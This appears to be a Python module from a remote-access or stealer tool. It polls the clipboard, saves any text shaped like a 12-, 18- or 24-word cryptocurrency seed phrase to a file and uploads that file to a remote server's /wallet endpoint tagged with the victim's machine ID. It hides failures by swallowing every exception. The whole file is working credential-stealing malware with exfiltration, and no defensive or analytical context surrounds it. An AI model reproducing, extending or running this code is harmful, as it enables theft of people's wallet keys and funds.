import re
import time
import pyperclip
import threading
import os
from datetime import datetime
from features.curlmanager import CurlManager
from config import INSTALL_LOCATION

TARGET = {12, 18, 24}
target_dir = os.path.expandvars(INSTALL_LOCATION)
os.makedirs(target_dir, exist_ok=True)
wallet_file_path = os.path.join(target_dir, "seed_phrases.txt")

def is_seed_like(text):
    text = text.strip()
    if not text:
        return False
    words = re.findall(r"[A-Za-z]+", text)
    token_count = len(words)
    return token_count in TARGET

def wallet(poll_interval=1):
    last = None
    try:
        while True:
            txt = pyperclip.paste()
            if txt and txt != last:
                last = txt
                if is_seed_like(txt):
                    with open(wallet_file_path, "a") as f:
                        f.write(txt + "\n\n")
            time.sleep(poll_interval)
    except KeyboardInterrupt:
        pass

def send_wallet_file(cfc_instance):    
    try:
        if os.path.exists(wallet_file_path) and os.path.getsize(wallet_file_path) > 0:

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            name = f"wallet_{cfc_instance.client_data['pc_id']}_{timestamp}"

            try:
            
                curl = CurlManager()
                curl.set_headers(cfc_instance.headers)
                url = f"{cfc_instance.base_url}/wallet?pc_id={cfc_instance.client_data['pc_id']}&filename={name}"
                
                curl.post_file(
                    url=url,
                    file_path=wallet_file_path,
                    field_name='file'
                )
            except Exception as e:
                pass
    except:
        pass